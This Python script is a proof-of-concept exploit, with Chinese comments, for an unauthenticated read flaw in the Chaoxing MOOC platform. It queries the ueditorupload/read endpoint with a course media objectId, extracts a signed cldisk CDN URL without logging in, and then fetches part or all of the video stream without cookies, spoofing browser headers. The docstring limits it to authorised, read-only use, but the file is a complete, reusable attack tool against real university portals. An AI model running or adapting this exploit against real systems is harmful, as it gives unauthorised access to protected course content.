# -*- coding: utf-8 -*-
"""
超星慕课 课程媒体对象未授权读 PoC（复用版，不存实值）
=====================================================
指纹：`mooc-ans/ueditorupload/read?objectId=<24hex>` 不验登录/归属/公开性 → cldisk 签名地址 → 无 Cookie 取流。
用法：
    python cx_mooc_media_unauth_read.py <object_id> --host <门户host>
        [--range N]   # 取前 N 字节见 MP4 魔数（默认仅取签名地址，不发取流）
        [--full]      # 全量下载（谨慎，仅授权目标）
        [--output F]
退出码：0=成立 2=条件不成立 3=参数错误。
边界：只读、默认不全量、不做对象枚举；仅授权目标；objectId 只输已知已取证值。
"""
import argparse, re, sys, time
from pathlib import Path
from urllib.request import Request, urlopen

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0 Safari/537.36")
CDN_RE = re.compile(r'https?://(?:s\d+\.)?cldisk\.com/\S+at_=\d+&ak_=[0-9a-f]+&ad_=[0-9a-f]+')
LOG = Path(__file__).with_suffix(".log")


def log(m: str):
    line = f"[{time.strftime('%H:%M:%S')}] {m}"
    print(line, flush=True)
    with LOG.open("a", encoding="utf-8") as f:
        f.write(line + "\n")


def get(url: str, host: str, is_cdn: bool = False) -> tuple[int, dict, bytes]:
    """直连(不走代理)。"""
    h = {"Host": host, "User-Agent": UA, "Accept-Encoding": "identity",
         "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close",
         "Accept": "*/*" if is_cdn else "text/html,*/*;q=0.8"}
    if is_cdn:
        h["Referer"] = f"http://{host}/mooc-ans/ueditorupload/read"
        h.update({"Sec-Fetch-Dest": "video", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Site": "cross-site"})
    req = Request(url, headers=h)
    try:
        with urlopen(req, timeout=40) as r:
            return r.status, dict(r.headers), r.read()
    except Exception as e:
        return 0, {}, f"ERR: {e}".encode()


def step1(o: str, host: str) -> str:
    u = f"http://{host}/mooc-ans/ueditorupload/read?objectId={o}"
    log(f"STEP1 -> {u}")
    st, _, body = get(u, host)
    if st != 200:
        log(f"STEP1 FAIL http {st}"); return ""
    m = CDN_RE.search(body.decode("utf-8", "replace"))
    if not m:
        log("STEP1 FAIL 无 cldisk 签名地址（对象不存在/已鉴权）"); return ""
    log(f"STEP1 OK  {m.group(0)[:70]}..."); return m.group(0)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("object_id", help="24 位 hex objectId（须已知/已取证）")
    ap.add_argument("--host", default="mooc1.<HOST>.edu.cn")
    ap.add_argument("--range", type=int, default=0)
    ap.add_argument("--full", action="store_true")
    ap.add_argument("--output", default="")
    a = ap.parse_args()
    if not re.fullmatch(r"[0-9a-fA-F]{24}", a.object_id):
        log("objectId 应 24 位 hex"); return 3
    signed = step1(a.object_id, a.host)
    if not signed:
        log("结论: 不成立"); return 2
    if not (a.range or a.full):
        log("结论: 成立（STEP1 未登录得签名）；加 --range/--full 取流验证"); return 0
    # Range 取流
    h = signed.split("//")[1].split("/")[0]
    limit = a.range or 0
    url = signed if a.full else f"{signed}"  # Range 头由 step2 内加
    rh = {"Host": h, "User-Agent": UA, "Accept": "*/*", "Accept-Encoding": "identity",
          "Referer": signed, "Sec-Fetch-Dest": "video", "Sec-Fetch-Mode": "no-cors"}
    if not a.full:
        rh["Range"] = f"bytes=0-{limit-1}"
    req = Request(url, headers=rh)
    try:
        with urlopen(req, timeout=120) as r:
            st = r.status; hd = dict(r.headers); data = r.read()
    except Exception as e:
        log(f"STEP2 FAIL {e}"); return 2
    ct = hd.get("Content-Type", "")
    ok = st in (200, 206) and data[4:8] == b"ftyp" and (ct.startswith("video/") or ct.startswith("application/octet-stream"))
    log(f"STEP2 {st} {ct} Content-Length={hd.get('Content-Length')} 取回{len(data)}B magic={data[:16].hex(' ')}")
    if a.output:
        Path(a.output).write_bytes(data)
        log(f"已写 {a.output}")
    log(f"结论: {'成立(未授权取流)' if ok else 'WARN 见上'}"); return 0 if ok else 2


if __name__ == "__main__":
    sys.exit(main())